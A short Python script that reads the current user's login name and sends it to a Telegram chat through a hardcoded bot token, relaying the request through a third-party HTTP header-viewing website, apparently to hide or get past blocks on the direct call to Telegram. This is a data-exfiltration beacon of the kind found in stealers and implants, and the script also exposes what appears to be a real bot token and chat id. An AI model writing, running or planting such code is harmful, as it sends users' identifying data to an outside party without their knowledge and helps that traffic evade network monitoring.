import os
import requests
my_bot_token = "6784243877:AAG58bNMvwp6kEdUvG2bX2C2L1dGCKrbpLI"
chat_id = "1663788795"

user_name = os.getlogin()
message = f"{user_name}\n set"

url = f"https://api.telegram.org/bot{my_bot_token}/sendmessage?chat_id={chat_id}&text={message}"
mypay = {"UrlBox":url,
"AgentBox":"Google Chrome",
"VersionsList":"HTTP/1.1",
"MethodList":"GET"}
send = requests.post(url="https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mypay)
print(send)